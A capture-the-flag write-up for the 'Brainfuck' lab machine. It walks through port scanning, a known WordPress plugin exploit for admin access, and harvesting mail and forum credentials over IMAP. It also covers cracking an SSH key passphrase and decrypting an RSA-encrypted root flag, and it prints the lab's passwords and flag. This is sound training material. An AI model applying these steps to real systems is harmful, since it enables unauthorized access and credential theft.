# Brainfuck Write-up

\# BlueBrain

## Enumeration

### Nmap

```
# nmap -sC -sV -oA nmap 10.10.10.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 14:33 EDT
Nmap scan report for 10.10.10.17
Host is up (0.17s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE PIPELINING CAPA UIDL RESP-CODES TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: listed IMAP4rev1 LOGIN-REFERRALS more ENABLE OK post-login ID LITERAL+ SASL-IR IDLE AUTH=PLAINA0001 Pre-login have capabilities
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.22 seconds
```

Nmap reveals several open services as well as several hostnames that were enumerated through the SSL certificate. Adding the hostnames to `/etc/hosts` is required to view the sites.

### WPScan

```
# wpscan --url https://brainfuck.htb --disable-tls-checks

...

 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection                                                                                                                      
 |     Fixed in: 8.0.0                                                                                   
 |     References:                                                                                                                                                                                                
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757                          
 |      - https://www.exploit-db.com/exploits/40939/                                                     
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/                                                                                        
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system

 ...
```

WPScan finds an authenticates SQL injection vulnerability, however the results overall do not find anything of much use. Searching Exploit-DB for more exploits related to the ticket system yields https://www.exploit-db.com/exploits/41006/

## Exploitation

### Wordpress

Gaining access to the Wordpress admin account is trivial using the above exploit. All that is required is setting the target URL and user. The username, `admin`, can be easily guessed and it is the default username when installing Wordpress. After running the exploit, the admin panel can be accessed at `/wp-admin/`

After gaining access, some credentials can be found on the `Settings > Easy WP SMTP` page. The password can be extracted simply by viewing the page source.

```
SMTP:orestis:kHGuERB29DNiNE
```

### Mail Server

Using the credentials obtained from wordpress, it is trivial to extract the emails from the server. Any IMAP-capable mail client or even Telnet can be used here. The example below will use Telnet.

```
# **telnet brainfuck.htb** 143                                                                             
Trying 10.10.10.17...
Connected to brainfuck.htb.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
a1 LOGIN orestis kHGuERB29DNiNE
a1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UID
PLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SPECIAL-USE] Logged in
a2 LIST "" "*"                                 
* LIST (\HasNoChildren) "/" INBOX
a2 OK List completed (0.000 + 0.000 secs).
a3 EXAMINE INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 2 EXISTS
* 0 RECENT                                 
* OK [UIDVALIDITY 1493461609] UIDs valid
* OK [UIDNEXT 5] Predicted next UID
* OK [HIGHESTMODSEQ 4] Highest   
a3 OK [READ-ONLY] Examine completed (0.000 + 0.000 secs).
a4 FETCH 1 BODY[]                  
* 1 FETCH (BODY[] {977}                        
Return-Path: <www-data@brainfuck.htb>                                                                    
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33) 
        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb      
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php                                                         
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
                                                    
Your new WordPress site has been successfully set up at:
                                                    
https://brainfuck.htb      
                                                    
You can log in to the administrator account with the following information:                          
                                                    
Username: admin                                                                                                                                                                                                   
Password: The password you chose during the install.                                                                                                                                                              
Log in here: https://brainfuck.htb/wp-login.php
                                                    
We hope you enjoy your new site. Thanks!  
                                                    
--The WordPress Team                              
https://wordpress.org/                     
)         
a4 OK Fetch completed (0.001 + 0.000 secs).
a5 FETCH 2 BODY[]                       
* 2 FETCH (BODY[] {514}            
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis                                                                                   
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)                                            
To: orestis@brainfuck.htb           
Subject: Forum Access Details      
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)                                                             
From: root@brainfuck.htb (root)
                                                    
Hi there, your credentials for our "secret" forum are below :)                                           
                                                    
username: orestis                        
password: kIEnnfEKJ#9UmdO                                                                                
                                                                                                         
Regards          
)                                      
a5 OK Fetch completed (0.001 + 0.000 secs).
```

The second email exposes credentials that can be used to log in at `sup3rs3cr3t.brainfuck.htb`

### Forums

Tool: http://rumkin.com/tools/cipher/vigenere.php

Looking at the `Key` discussion, it appears that the post is encrypted. In this case, the cipher used is basic Vigenere. By comparing the last line of text in each of orestis’ posts to the posts in the `SSH Access` discussion, it is possible to extract the key.

After a bit of playing around with the output, the key appears to be `fuckmybrain`. Using that, it is possible to decrypt the posts.

The RSA key has a passphrase that must be cracked. This can be achieved by running `ssh2john id_rsa > brainfuck-crack` and then `john brainfuck-crack --wordlist=<PATH TO ROCKYOU.TXT>`

```
# ls                                  
brainfuck-crack  creds  decrypt  exploit.html  id_rsa  nmap.gnmap  nmap.nmap  nmap.xml

# chmod 600 id_rsa

# ssh -i id_rsa orestis@brainfuck.htb
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com

...
```

The user flag can be obtained from `/home/orestis/user.txt`

### RSA Decryption

Script: https://crypto.stackexchange.com/a/19530

Looking at the contents of the files in the `/home/orestis` directory, specifically `encrypt.sage`, it appears that the file `output.txt` contains an encrypted root flag and the file `debug.txt` contains the P, Q and E values used to do the encryption. By using the above Python script, it is possible to decrypt the ciphertext and get the root flag.

```
# python decrypt.py                                                                                    
n:  87306194345054242026952433931108752998248379160051834957116058715997042269782950962413572777091976016372673709573002672355767945889107793840035654491713366855473987716180186966474046572667055368591252274362
28202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

To convert the plaintext result from decimal to ASCII, the following command can be used: 

```
# python
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> decoded_string = bytes.fromhex((hex(pt)[2:] if len(hex(pt)[2:]) % 2 == 0 else '0' + hex(pt)[2:])).decode('utf-8')
>>> print(decoded_string)
6efc1a5dbb8904751ce6566a305bb8ef
```

